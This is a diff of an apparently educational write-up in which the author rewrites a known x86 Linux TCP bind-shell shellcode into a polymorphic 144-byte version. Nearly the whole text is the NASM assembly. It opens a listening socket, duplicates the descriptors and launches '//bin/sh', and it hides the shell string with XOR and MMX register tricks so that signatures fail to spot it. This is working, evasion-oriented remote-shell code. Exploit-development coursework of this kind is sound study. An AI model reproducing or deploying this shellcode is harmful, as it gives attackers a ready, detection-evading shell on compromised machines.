@@ -31,28 +31,32 @@ The first shellcode I modified was "tcpbindshell (108 bytes)", created by Russel
 This shellcode can be found at http://shell-storm.org/shellcode/files/shellcode-847.php.  
 
 The original shellcode length was 108 bytes. Our assignment required that our polymorphic version of the shellcode to not exceed 150% of the original value. The final length of this polymorphic shellcode is 144 bytes.  
-To push the filename string "//bin/sh" onto the stack, I used the MMX registers.  
+To push the filename string "//bin/sh" onto the stack, I used the MMX registers.   
+The code I added / modified is indented.
 
 ```nasm
+; Original_Length: 108 bytes	Final_Length: 144 bytes
 global _start
 _start:
-xor    eax,eax
-xor    ebx,ebx
-xor    ecx,ecx
-xor    edx,edx
-mov    al,0x66
-mov    bl,0x1
-push   ecx
+	xor	ecx,ecx		; Makes the ECX Register 0
+	mul	ecx			; ECX*EAX. Result is stored in EDX:EAX. This clears the EDX and EAX.
+	mov ebx, eax	; sets the EBX register to 0
+	push byte 0x66
+	pop edi			; save this for the other functions
+	mov eax, edi	; eax is now 0x66 which is the socketcall SYScal
+	inc ebx			; EBX = 1; needed to create the socket()
+	push edx
 push   0x6
-push   0x1
+	push ebx	 	; push 0x1 to the stack 
 push   0x2
 mov    ecx,esp
 int    0x80
-mov    esi,eax
-mov    al,0x66
-mov    bl,0x2
+	xchg esi,eax
+
+	mov eax, edi	; EAX = 0x66 used for socketcall SYSCAL
+	inc ebx			; EBX = 0x2
 push   edx
-pushw  0x697a
+push word 0x697a	; port TCP 
 push   bx
 mov    ecx,esp
 push   0x10
@@ -60,27 +64,16 @@ push   ecx
 push   esi
 mov    ecx,esp
 int    0x80
-mov    al,0x66
-mov    bl,0x4
+
+	mov eax, edi	; EAX = 0x66 used for socketcall SYSCAL
+	inc ebx
+	inc ebx			; EBX = 0x4
 push   0x1
 push   esi
 mov    ecx,esp
 int    0x80
-mov    al,0x66
-mov    bl,0x5
-push   edx
-push   edx
-push   esi
-mov    ecx,esp
-int    0x80
-mov    ebx,eax
-xor    ecx,ecx
-mov    cl,0x3
-
-; dup2
-int    0x80
-        mov eax, edi    ; EAX = 0x66 used for socketcall SYSCAL
-        inc ebx
+	mov eax, edi	; EAX = 0x66 used for socketcall SYSCAL
+	inc ebx
 push   edx
 push   edx
 push   esi
@@ -94,19 +87,19 @@ mov    cl,0x3
 
 ; dup2
 dup2Loop:
-        dec ecx
+	dec ecx
 mov    al,0x3f
 int    0x80
 jne    dup2Loop
 
 push   edx
-        mov edx, 0xffffffff             ; will be used to XOR the MM0 Register to result in "//bin/sh"
+	mov edx, 0xffffffff             ; will be used to XOR the MM0 Register to result in "//bin/sh"
     mov eax, 0x978cd091             ; "n/sh" XOR'd with 0xffffffff
         ;   mov eax, 0x68732f6e             ; "n/sh"
     movd mm0, eax
     psllq mm0, 32                   ; shift the mm0 register left by 4 bytes
     mov ebx, 0x969dd0d0             ; "//bi" XOR'd with 0xffffffff
-        ;   mov ebx, 0x69622f2f             ; "//bi"
+        ;   mov ebx, 0x69622f2f             ; "//bi" 
     movd mm1, ebx
     paddb mm0, mm1                  ; now mm0 hold the 8 byte XOR'd "//bin/sh"
     movd mm1, edx                   ; mm1 is now 0xffffffff
@@ -126,6 +119,7 @@ push   eax
 mov    edx,esp
 mov    al,0xb
 int    0x80
+
 ```  
 
 I compiled and linked the shellcode. Then I used object dump to extract the hex.  
